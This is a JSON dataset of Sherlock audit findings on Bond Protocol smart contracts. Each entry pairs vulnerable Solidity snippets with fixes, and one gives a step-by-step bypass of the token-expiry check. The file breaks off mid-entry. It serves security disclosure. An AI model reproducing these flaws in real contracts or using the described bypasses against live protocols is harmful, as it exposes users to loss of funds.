      "summary": "\nThis bug report is about an issue in the BondAggregator.findMarketFor function which will break when the BondBaseSDA.payoutFor function within the for-loop reverts under certain conditions. The BondBaseSDA.payoutFor function will revert if the computed payout is larger than the market's max payout. If the user configures the minAmountOut_ to be 0, then the condition minAmountOut_ <= maxPayout Line 244 will always be true and the amountIn_ will always be passed to the payoutFor function, causing the BondAggregator.findMarketFor function to revert in some markets where the computed payout is larger than the max payout. \n\nThe impact of this issue is that the find market feature within the protocol is broken under certain conditions, and users will not be able to obtain the list of markets that meet their requirements. The market makers affected by this issue will lose the opportunity to sell their bond tokens.\n\nThe code snippets mentioned in the bug report are BondBaseSDA.sol at Line 711 and BondAggregator.sol at Line 221. The bug was found using manual review. The recommendation is to consider using try-catch or address.call to handle the revert of the BondBaseSDA.payoutFor function within the for-loop gracefully. This ensures that a single revert of the BondBaseSDA.payoutFor function will not affect the entire for-loop within the BondAggregator.findMarketFor function. The bug was fixed in https://github.com/Bond-Protocol/bonds/commit/56a11260c40785509215b8c81830f6270b46d15f.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/14",
      "tags": [
        "Broken Loop"
      ],
      "finders": [
        "xiaoming90"
      ]
    },
    {
      "id": "3533",
      "title": "M-9: Create Fee Discount Feature Is Broken",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/16 \n\n## Found by \nxiaoming90, 8olidity\n\n## Summary\n\n The create fee discount feature is found to be broken within the protocol. \n\n## Vulnerability Detail\n\nThe create fee discount feature relies on the `createFeeDiscount` state variable to determine the fee to be discounted from the protocol fee. However, it was observed that there is no way to initialize the `createFeeDiscount` state variable. As a result, the `createFeeDiscount` state variable will always be zero.\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedExpiryTeller.sol#L118\n\n```solidity\nFile: BondFixedExpiryTeller.sol\n118:         // If fee is greater than the create discount, then calculate the fee and store it\n119:         // Otherwise, fee is zero.\n120:         if (protocolFee > createFeeDiscount) {\n121:             // Calculate fee amount\n122:             uint256 feeAmount = amount_.mulDiv(protocolFee - createFeeDiscount, FEE_DECIMALS);\n123:             rewards[_protocol][underlying_] += feeAmount;\n124: \n125:             // Mint new bond tokens\n126:             bondToken.mint(msg.sender, amount_ - feeAmount);\n127: \n128:             return (bondToken, amount_ - feeAmount);\n129:         } else {\n130:             // Mint new bond tokens\n131:             bondToken.mint(msg.sender, amount_);\n132: \n133:             return (bondToken, amount_);\n134:         }\n```\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedTermTeller.sol#L118\n\n```solidity\nFile: BondFixedTermTeller.sol\n118:         // If fee is greater than the create discount, then calculate the fee and store it\n119:         // Otherwise, fee is zero.\n120:         if (protocolFee > createFeeDiscount) {\n121:             // Calculate fee amount\n122:             uint256 feeAmount = amount_.mulDiv(protocolFee - createFeeDiscount, FEE_DECIMALS);\n123:             rewards[_protocol][underlying_] += feeAmount;\n124: \n125:             // Mint new bond tokens\n126:             _mintToken(msg.sender, tokenId, amount_ - feeAmount);\n127: \n128:             return (tokenId, amount_ - feeAmount);\n129:         } else {\n130:             // Mint new bond tokens\n131:             _mintToken(msg.sender, tokenId, amount_);\n132: \n133:             return (tokenId, amount_);\n134:         }\n```\n\n## Impact\n\n The create fee discount feature is broken within the protocol. There is no way for the protocol team to configure a discount for the users of the `BondFixedExpiryTeller.create` and `BondFixedTermTeller.create` functions. As such, the users will not obtain any discount from the protocol when using the create function.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedExpiryTeller.sol#L118\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedTermTeller.sol#L118\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nImplement a setter method for the `createFeeDiscount` state variable and the necessary verification checks.\n\n```solidity\nfunction setCreateFeeDiscount(uint48 createFeeDiscount_) external requiresAuth {\n    if (createFeeDiscount_ > protocolFee)  revert Teller_InvalidParams();\n    if (createFeeDiscount_ > 5e3) revert Teller_InvalidParams();\n    createFeeDiscount = createFeeDiscount_;\n}\n```\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree. We implemented a `setCreateFeeDiscount` function on the BondBaseTeller to allow updating the create fee discount.\n\n\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/570eb0b74b2401c7b6d07a30f8dd452bf7f225f9",
      "summary": "\nThis bug report is about a broken create fee discount feature within the Bond Protocol. The feature relies on a `createFeeDiscount` state variable to determine the fee to be discounted from the protocol fee. However, it was observed that there is no way to initialize the `createFeeDiscount` state variable, resulting in the `createFeeDiscount` state variable always being zero. As a result, users will not obtain any discount from the protocol when using the create function. The bug was found by xiaoming90 and 8olidity and was fixed by implementing a `setCreateFeeDiscount` function on the BondBaseTeller to allow updating the create fee discount.",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/16",
      "tags": [
        "Parameter Setter"
      ],
      "finders": [
        "8olidity",
        "xiaoming90"
      ]
    },
    {
      "id": "3532",
      "title": "M-8: Teller Cannot Be Removed From Callback Contract",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/18 \n\n## Found by \nxiaoming90\n\n## Summary\n\nIf a vulnerable Teller is being exploited by an attacker, there is no way for the owner of the Callback Contract to remove the vulnerable Teller from their Callback Contract.\n\n## Vulnerability Detail\n\nThe Callback Contract is missing the feature to remove a Teller. Once a Teller has been added to the whitelist (`approvedMarkets` mapping), it is not possible to remove the Teller from the whitelist.\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseCallback.sol#L59\n\n```solidity\nFile: BondBaseCallback.sol\n56:     /* ========== WHITELISTING ========== */\n57: \n58:     /// @inheritdoc IBondCallback\n59:     function whitelist(address teller_, uint256 id_) external override onlyOwner {\n60:         // Check that the market id is a valid, live market on the aggregator\n61:         try _aggregator.isLive(id_) returns (bool live) {\n62:             if (!live) revert Callback_MarketNotSupported(id_);\n63:         } catch {\n64:             revert Callback_MarketNotSupported(id_);\n65:         }\n66: \n67:         // Check that the provided teller is the teller for the market ID on the stored aggregator\n68:         // We could pull the teller from the aggregator, but requiring the teller to be passed in\n69:         // is more explicit about which contract is being whitelisted\n70:         if (teller_ != address(_aggregator.getTeller(id_))) revert Callback_TellerMismatch();\n71: \n72:         approvedMarkets[teller_][id_] = true;\n73:     }\n```\n\n## Impact\n\nIn the event that a whitelisted Teller is found to be vulnerable and has been actively exploited by an attacker in the wild, the owner of the Callback Contract needs to mitigate the issue swiftly by removing the vulnerable Teller from the Callback Contract to stop it from draining the asset within the Callback Contract. However, the mitigation effort will be hindered by the fact there is no way to remove a Teller within the Callback Contract once it has been whitelisted. Thus, it might not be possible to stop the attacker from exploiting the vulnerable Teller to drain assets within the Callback Contract. The Callback Contract owners would need to find a workaround to block the attack, which will introduce an unnecessary delay to the recovery process where every second counts.\n\nAdditionally, if the owner accidentally whitelisted the wrong Teller, there is no way to remove it.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseCallback.sol#L59\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider implementing an additional function to allow the removal of a Teller from the whitelist (`approvedMarkets` mapping), so that a vulnerable Teller can be removed swiftly if needed.\n\n```solidity\nfunction removeFromWhitelist(address teller_, uint256 id_) external override onlyOwner {\n    approvedMarkets[teller_][id_] = false;\n}\n```\n\nNote: Although the owner of the Callback Contract can DOS its own market by abusing the `removeFromWhitelist` function, no sensible owner would do so.\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree with this issue. We implemented a `blacklist()` function on the BondBaseCallback.sol contract to allow removing a teller and market ID combination from using the callback.\n\n\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/368e6c5b120d9fc44c59cc21d33ee51728728067",
      "summary": "\nThis bug report is about a missing feature on the Callback Contract which prevents the owner from removing a vulnerable Teller from the whitelist (`approvedMarkets` mapping). This means that if a vulnerable Teller is being exploited by an attacker, there is no way for the owner of the Callback Contract to remove it from their Callback Contract. This could lead to the attacker being able to exploit the vulnerable Teller to drain assets within the Callback Contract, and the owner would need to find a workaround to block the attack, introducing an unnecessary delay to the recovery process.\n\nThe bug was found by xiaoming90 and was fixed by Bond-Protocol in https://github.com/Bond-Protocol/bonds/commit/368e6c5b120d9fc44c59cc21d33ee51728728067. The recommendation is to consider implementing an additional function to allow the removal of a Teller from the whitelist (`approvedMarkets` mapping), so that a vulnerable Teller can be removed swiftly if needed.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/18",
      "tags": [
        "Whitelist/Blacklist Match"
      ],
      "finders": [
        "xiaoming90"
      ]
    },
    {
      "id": "3531",
      "title": "M-7: Market Price Lower Than Expected",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/20 \n\n## Found by \nxiaoming90\n\n## Summary\n\nThe market price does not conform to the specification documented within the whitepaper. As a result, the computed market price is lower than expected.\n\n## Vulnerability Detail\n\nThe following definition of the market price is taken from the whitepaper. Taken from Page 13 of the whitepaper - Definition 25\n\n![image-20221114132609169](https://user-images.githubusercontent.com/102820284/201850739-496a5e30-bb92-40e3-acfc-6d46821a4eab.png)\n\nThe integer implementation of the market price must be rounded up per the whitepaper. This ensures that the integer implementation of the market price is greater than or equal to the real value of the market price so as to protect makers from selling tokens at a lower price than expected.\n\nWithin the `BondBaseSDA.marketPrice` function, the computation of the market price is rounded up in Line 688, which conforms to the specification.\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L687\n\n```solidity\nFile: BondBaseSDA.sol\n687:     function marketPrice(uint256 id_) public view override returns (uint256) {\n688:         uint256 price = currentControlVariable(id_).mulDivUp(currentDebt(id_), markets[id_].scale);\n689: \n690:         return (price > markets[id_].minPrice) ? price : markets[id_].minPrice;\n691:     }\n```\n\nHowever, within the `BondBaseSDA._currentMarketPrice` function, the market price is rounded down, resulting in the makers selling tokens at a lower price than expected.\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L631\n\n```solidity\nFile: BondBaseSDA.sol\n631:     function _currentMarketPrice(uint256 id_) internal view returns (uint256) {\n632:         BondMarket memory market = markets[id_];\n633:         return terms[id_].controlVariable.mulDiv(market.totalDebt, market.scale);\n634:     }\n```\n\n## Impact\n\nLoss for the makers as their tokens are sold at a lower price than expected.\n\nAdditionally, the affected `BondBaseSDA._currentMarketPrice` function is used within the `BondBaseSDA._decayAndGetPrice` function to derive the market price. Since a lower market price will be returned, this will lead to a higher amount of payout tokens. Subsequently, the `lastDecayIncrement` will be higher than expected, which will lead to a lower `totalDebt`. Lower debt means a lower market price will be computed later.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L687\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L631\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nEnsure the market price is rounded up so that the desired property can be achieved and the makers will not be selling tokens at a lower price than expected.\n\n```diff\nfunction _currentMarketPrice(uint256 id_) internal view returns (uint256) {\n    BondMarket memory market = markets[id_];\n-   return terms[id_].controlVariable.mulDiv(market.totalDebt, market.scale);\n+   return terms[id_].controlVariable.mulDivUp(market.totalDebt, market.scale);\n}\n```\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree with this issue. We have updated the price calculation in `_currentMarketPrice()` to round up to match the specification.\n\n\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/a77f0150dd4bf401a1b30c16eca4865bb69c59d3",
      "summary": "\nThis bug report is about an issue where the market price of a bond does not conform to the specification documented in the whitepaper. The integer implementation of the market price must be rounded up to ensure that the makers are not selling tokens at a lower price than expected. The bug was found by xiaoming90 and the impact of the bug is a loss for the makers. The code snippet of the bug is provided and the recommendation is to ensure that the market price is rounded up. The issue was fixed by the sponsor and xiaoming9090.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/20",
      "tags": [
        "Rounding"
      ],
      "finders": [
        "xiaoming90"
      ]
    },
    {
      "id": "3530",
      "title": "M-6: Existing Circuit Breaker Implementation Allow Faster Taker To Extract Payout Tokens From Market",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/21 \n\n## Found by \nhansfriese, xiaoming90\n\n## Summary\n\nThe current implementation of the circuit breaker is not optimal. Thus, the market maker will lose an excessive amount of payout tokens if a quoted token suddenly loses a large amount of value, even with a circuit breaker in place.\n\n## Vulnerability Detail\n\nWhen the amount of the payout tokens purchased by the taker exceeds the `term.maxDebt`, the taker is still allowed to carry on with the transaction, and the market will only be closed after the current transaction is completed.\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L427\n\n```solidity\nFile: BondBaseSDA.sol\n426:         // Circuit breaker. If max debt is breached, the market is closed\n427:         if (term.maxDebt < market.totalDebt) {\n428:             _close(id_);\n429:         } else {\n430:             // If market will continue, the control variable is tuned to to expend remaining capacity over remaining market duration\n431:             _tune(id_, currentTime, price);\n432:         }\n```\n\nAssume that the state of the SDAM at T0 is as follows:\n\n-  `term.maxDebt` is 110 (debt buffer = 10%)\n-  `maxPayout` is 100\n- `market.totalDebt` is 99\n\nAssume that the quoted token suddenly loses a large amount of value (e.g. stablecoin depeg causing the quote token to drop to almost zero). Bob decided to purchase as many payout tokens as possible before reaching the `maxPayout` limit to maximize the value he could extract from the market. Assume that Bob is able to purchase 50 bond tokens at T1 before reaching the `maxPayout` limit. As such, the state of the SDAM at T1 will be as follows:\n\n- `term.maxDebt` = 110\n- `maxPayout` = 100\n- `market.totalDebt` = 99 + 50 = 149\n\nIn the above scenario, Bob's purchase has already breached the `term.maxDebt` limit. However, he could still purchase the 50 bond tokens in the current transaction.\n\n## Impact\n\nIn the event that the price of the quote token falls to almost zero (e.g. 0.0001 dollars), then the fastest taker will be able to extract as many payout tokens as possible before reaching the `maxPayout` limit from the market. The extracted payout tokens are essentially free for the fastest taker. Taker gain is maker loss.\n\nAdditionally, in the event that a quoted token suddenly loses a large amount of value, the amount of payout tokens lost by the market marker is capped at the `maxPayout` limit instead of capping the loss at the `term.maxDebt` limit. This resulted in the market makers losing more payout tokens than expected, and their payout tokens being sold to the takers at a very low price (e.g. 0.0001 dollars).\n\nThe market makers will suffer more loss if the `maxPayout` limit of their markets is higher.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L427\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsidering only allowing takers to purchase bond tokens up to the `term.maxDebt` limit.\n\nFor instance, based on the earlier scenario, only allow Bob to purchase up to 11 bond tokens (term.maxDebt[110] - market.totalDebt[99]) instead of allowing him to purchase 50 bond tokens. \n\nIf Bob attempts to purchase 50 bond tokens, the market can proceed to purchase the 11 bond tokens for Bob, and the remaining quote tokens can be refunded back to Bob. After that, since the `term.maxDebt (110) == market.totalDebt (110)`, the market can trigger the circuit breaker to close the market to protect the market from potential extreme market conditions. \n\nThis ensures that bond tokens beyond the `term.maxDebt` limit would not be sold to the taker during extreme market conditions.\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nWe acknowledge that this can be an issue in an edge case, but do not believe it is a High severity issue. Specifically, it requires a quote token to rapidly collapse in value AND a market to be configured with a large maxPayout (i.e. long deposit interval). Additionally, the potential updates (limiting purchase amount, reverting the transaction) have their own issues. Reverting the transaction will leave the market open, allow a retry transaction with a smaller amount, and have the price continue decaying (perhaps allowing additional buys) if the owner doesn't recognize the issue and close the market. Limiting the purchase amount requires a large amount of refactoring and would introduce additional gas costs for the checks required. We do not believe protecting from the edge case warrants the additional costs.\n\n**Evert0x**\n\nDowngrading to medium because of comment from protocol",
      "summary": "\nThis bug report is about an issue with the circuit breaker implementation in the BondBaseSDA.sol smart contract. The current implementation of the circuit breaker is not optimal, which can lead to a market maker losing an excessive amount of payout tokens if a quoted token suddenly loses a large amount of value, even with a circuit breaker in place. The issue is that when the amount of the payout tokens purchased by the taker exceeds the `term.maxDebt`, the taker is still allowed to carry on with the transaction, and the market will only be closed after the current transaction is completed. \n\nThis means that if the price of the quote token falls to almost zero, then the fastest taker will be able to extract as many payout tokens as possible before reaching the `maxPayout` limit from the market. The extracted payout tokens are essentially free for the fastest taker, and the market makers will suffer more loss if the `maxPayout` limit of their markets is higher. \n\nThe recommendation is to consider only allowing takers to purchase bond tokens up to the `term.maxDebt` limit. This means that if a taker attempts to purchase more than the `term.maxDebt` limit, the market can proceed to purchase the amount allowed and the remaining quote tokens can be refunded back to the taker. This ensures that bond tokens beyond the `term.maxDebt` limit would not be sold to the taker during extreme market conditions.\n\nThe bug report was found by hansfriese and xiaoming90, and the tool used was manual review. The sponsor has downgraded the bug from High severity to Medium because of the comment from the protocol.",
      "quality_score": 3,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/21",
      "tags": [],
      "finders": [
        "hansfriese",
        "xiaoming90"
      ]
    },
    {
      "id": "3527",
      "title": "M-3: Lack of events for critical arithmetic parameters",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/33 \n\n## Found by \nzimu\n\n## Summary\nFunction `BondBaseSDA.setDefaults` sets critical arithmetic parameters for bond market. But it has no event emitted, it is difficult to track these critical changes off-chain.\n\n## Vulnerability Detail\nIn `bases/BondBaseSDA`, critical parameters are set and changed in function `BondBaseSDA.setDefaults` for bond market.\n![image](https://user-images.githubusercontent.com/112361239/201988699-b740b31b-e6d1-4bd8-b3da-2fb9bc7c68bd.png)\n\nHowever, no event is emitted, and it is difficult to track these critical changes off-chain.  Both Users and Issuers would possibly be unware of  these changes.\n\n## Impact\nBoth Users and Issuers would possibly be unware of  critical changes on bond market.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L348-L356\n\n## Tool used\nManual Review\n\n## Recommendation\nAdd an event in `BondBaseSDA.setDefaults` to report critical arithmetic changes.\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree. We have updated `setDefaults` to emit an event with the newly set values.\n\n\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/94e38f33b69b0184762c8be1c7bfd0716d97fed2",
      "summary": "\nThis bug report is about the lack of events emitted for critical arithmetic parameters in the function `BondBaseSDA.setDefaults` of BondBaseSDA. This function sets critical parameters for the bond market, but no events are emitted to track the changes off-chain. This means that both users and issuers would be unaware of these changes. The bug was found by zimu and the recommendation was to add an event to report the critical arithmetic changes. The bug was fixed by Evert0x and xiaoming9090 in a commit to the GitHub repository.",
      "quality_score": 3,
      "rarity_score": 3.5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/33",
      "tags": [
        "Event"
      ],
      "finders": [
        "zimu"
      ]
    },
    {
      "id": "3526",
      "title": "M-2: findMarketFor() missing check minAmountOut_",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/38 \n\n## Found by \nbin2chen\n\n## Summary\nBondAggregator#findMarketFor() minAmountOut_ does not actually take effect，may return a market's \"payout\" smaller than minAmountOut_ , Causes users to waste gas calls to purchase\n\n## Vulnerability Detail\nBondAggregator#findMarketFor() has check minAmountOut_ <= maxPayout\nbut the actual \"payout\" by \"amountIn_\" no check  greater than minAmountOut_\n```solidity\n    function findMarketFor(\n        address payout_,\n        address quote_,\n        uint256 amountIn_,\n        uint256 minAmountOut_,\n        uint256 maxExpiry_\n    ) external view returns (uint256) {\n...\n            if (expiry <= maxExpiry_) {\n                payouts[i] = minAmountOut_ <= maxPayout\n                    ? payoutFor(amountIn_, ids[i], address(0))\n                    : 0;\n\n                if (payouts[i] > highestOut) {//****@audit not check payouts[i] >= minAmountOut_******//\n                    highestOut = payouts[i];\n                    id = ids[i];\n                }\n            }\n\n```\n\n\n## Impact\n\nThe user gets the optimal market through BondAggregator#findMarketFor(), but incorrectly returns a market smaller than minAmountOut_, and the call to purchase must fail, resulting in wasted gas\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondAggregator.sol#L248\n\n## Tool used\n\nManual Review\n\n## Recommendation\n```solidity\n    function findMarketFor(\n        address payout_,\n        address quote_,\n        uint256 amountIn_,\n        uint256 minAmountOut_,\n        uint256 maxExpiry_\n    ) external view returns (uint256) {\n...\n            if (expiry <= maxExpiry_) {\n                payouts[i] = minAmountOut_ <= maxPayout\n                    ? payoutFor(amountIn_, ids[i], address(0))\n                    : 0;\n\n-               if (payouts[i] > highestOut) {\n+               if (payouts[i] >= minAmountOut_ && payouts[i] > highestOut) {\n                    highestOut = payouts[i];\n                    id = ids[i];\n                }\n            }\n\n```\n\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree with this issue. We implemented a check for `payout >= minAmountOut_` within the loop.\n\n\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/7197f68354863c7b9be604d637cbc9b62105704b",
      "summary": "\nThis bug report is about an issue found in BondAggregator#findMarketFor() method of Bond Protocol. The issue is that minAmountOut_ does not actually take effect, which may result in returning a market's \"payout\" smaller than minAmountOut_, causing users to waste gas calls to purchase. This was found by bin2chen through manual review and the code snippet can be found on https://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondAggregator.sol#L248. The impact of this issue is that users are not able to get the optimal market through BondAggregator#findMarketFor() as it returns a market smaller than minAmountOut_, resulting in wasted gas. The recommendation to fix this issue is to add a check for `payout >= minAmountOut_` within the loop. This issue was fixed in https://github.com/Bond-Protocol/bonds/commit/7197f68354863c7b9be604d637cbc9b62105704b.",
      "quality_score": 3,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/38",
      "tags": [
        "MinOut/MaxIn Validation"
      ],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "3525",
      "title": "M-1: Transferring Ownership Might Break The Market",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/41 \n\n## Found by \nxiaoming90\n\n## Summary\n\nAfter the transfer of the market ownership, the market might stop working, and no one could purchase any bond token from the market leading to a loss of sale for the market makers.\n\n## Vulnerability Detail\n\nThe `callbackAuthorized` mapping contains a list of whitelisted market owners authorized to use the callback. When the users call the `purchaseBond` function, it will check at Line 390 if the current market owner is still authorized to use a callback. Otherwise, the function will revert.\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L379\n\n```solidity\nFile: BondBaseSDA.sol\n379:     function purchaseBond(\n380:         uint256 id_,\n381:         uint256 amount_,\n382:         uint256 minAmountOut_\n383:     ) external override returns (uint256 payout) {\n384:         if (msg.sender != address(_teller)) revert Auctioneer_NotAuthorized();\n385: \n386:         BondMarket storage market = markets[id_];\n387:         BondTerms memory term = terms[id_];\n388: \n389:         // If market uses a callback, check that owner is still callback authorized\n390:         if (market.callbackAddr != address(0) && !callbackAuthorized[market.owner])\n391:             revert Auctioneer_NotAuthorized();\n```\n\nHowever, if the market owner transfers the market ownership to someone else. The market will stop working because the new market owner might not be on the list of whitelisted market owners (`callbackAuthorized` mapping). As such, no one can purchase any bond token.\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L336\n\n```solidity\nFile: BondBaseSDA.sol\n336:     function pushOwnership(uint256 id_, address newOwner_) external override {\n337:         if (msg.sender != markets[id_].owner) revert Auctioneer_OnlyMarketOwner();\n338:         newOwners[id_] = newOwner_;\n339:     }\n```\n\n## Impact\n\nAfter the transfer of the market ownership, the market might stop working, and no one could purchase any bond token from the market leading to a loss of sale for the market makers.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L379\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L336\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nBefore pushing the ownership, if the market uses a callback, implement an additional validation check to ensure that the new market owner has been whitelisted to use the callback. This will ensure that transferring the market ownership will not break the market due to the new market owner not being whitelisted.\n\n```diff\nfunction pushOwnership(uint256 id_, address newOwner_) external override {\n    if (msg.sender != markets[id_].owner) revert Auctioneer_OnlyMarketOwner();\n+   if (markets[id_].callbackAddr != address(0) && !callbackAuthorized[newOwner_])\n+   \trevert newOwnerNotAuthorizedToUseCallback();\n    newOwners[id_] = newOwner_;\n}\n```\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAcknowledged. We added the check for the owner to be whitelisted for a callback on purchase to provide a shutdown mechanism in the event of a malicious callback. The ownership transfer functionality is meant to be used when a callback isn't being used to payout market purchases. E.g. create a market with an EOA from a script and transfer ownership to a multisig for payouts (would also require multisig to approve the teller for the capacity in payout tokens).",
      "summary": "\nThis bug report is about an issue found by xiaoming90, which was identified as \"Transferring Ownership Might Break The Market\". The issue occurs when users call the `purchaseBond` function and the market owner transfers the market ownership to someone else. This can cause the market to stop working because the new market owner might not be on the list of whitelisted market owners (`callbackAuthorized` mapping). As such, no one can purchase any bond token, leading to a loss of sale for the market makers. \n\nThe code snippet from BondBaseSDA.sol which is responsible for the issue is located on Lines 379 and 336. The issue is triggered when the `pushOwnership` function is called, which is located at Line 337. It checks if the sender of the message is the markets[id_].owner, and if not, the function reverts.\n\nThe recommended solution to this issue is to add an additional validation check to ensure that the new market owner has been whitelisted to use the callback before pushing the ownership. This will ensure that transferring the market ownership will not break the market due to the new market owner not being whitelisted. The code snippet for this solution is provided in the report.\n\nThe sponsor acknowledged the issue and provided a message. They added the check for the owner to be whitelisted for a callback on purchase to provide a shutdown mechanism in the event of a malicious callback. The ownership transfer functionality is meant to be used when a callback isn't being used to payout market purchases. This would also require multisig to approve the teller for the capacity in payout tokens.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/41",
      "tags": [
        "Ownership"
      ],
      "finders": [
        "xiaoming90"
      ]
    },
    {
      "id": "3524",
      "title": "H-1: Fixed Term Teller tokens can be created with an expiry in the past",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/34 \n\n## Found by \nobront\n\n## Summary\n\nThe Fixed Term Teller does not allow tokens to be created with a timestamp in the past. This is a fact that protocols using this feature will expect to hold and build their systems around. However, users can submit expiry timestamps slightly in the future, which correlate to tokenIds in the past, which allows them to bypass this check.\n\n## Vulnerability Detail\n\nIn `BondFixedTermTeller.sol`, the `create()` function allows protocols to trade their payout tokens directly for bond tokens. The expectation is that protocols will build their own mechanisms around this. It is explicitly required that they cannot do this for bond tokens that expire in the past, only those that have yet to expire:\n\n```solidity\nif (expiry_ < block.timestamp) revert Teller_InvalidParams();\n```\n\nHowever, because tokenIds round timestamps down to the latest day, protocols are able to get around this check.\n\nHere's an example:\n- The most recently expired token has an expiration time of 1668524400 (correlates to 9am this morning)\n- It is currently 1668546000 (3pm this afternoon)\n- A protocol calls create() with an expiry of 1668546000 + 1\n- This passes the check that `expiry_ >= block.timestamp`\n- When the expiry is passed to `getTokenId()` it rounds the time down to the latest day, which is the day corresponding with 9am this morning\n- This expiry associated with this tokenId is 9am this morning, so they are able to redeem their tokens instantly\n\n## Impact\n\nProtocols can bypass the check that all created tokens must have an expiry in the future, and mint tokens with a past expiry that can be redeemed immediately. \n\nThis may not cause a major problem for Bond Protocol itself, but protocols will be building on top of this feature without expecting this behavior. \n\nLet's consider, for example, a protocol that builds a mechanism where users can stake some asset, and the protocol will trade payout tokens to create bond tokens for them at a discount, with the assumption that they will expire in the future. This issue could create an opening for a savvy user to stake, mint bond tokens, redeem and dump them immediately, buy more assets to stake, and continue this cycle to earn arbitrage returns and tank the protocol's token.\n\nBecause there are a number of situations like the one above where this issue could lead to a major loss of funds for a protocol building on top of Bond, I consider this a high severity.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedTermTeller.sol#L97-L105\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nBefore checking whether `expiry_ < block.timestamp`, expiry should be rounded to the nearest day:\n\n```solidity\nexpiry = ((vesting_ + uint48(block.timestamp)) / uint48(1 days)) * uint48(1 days);\n```\n\n## 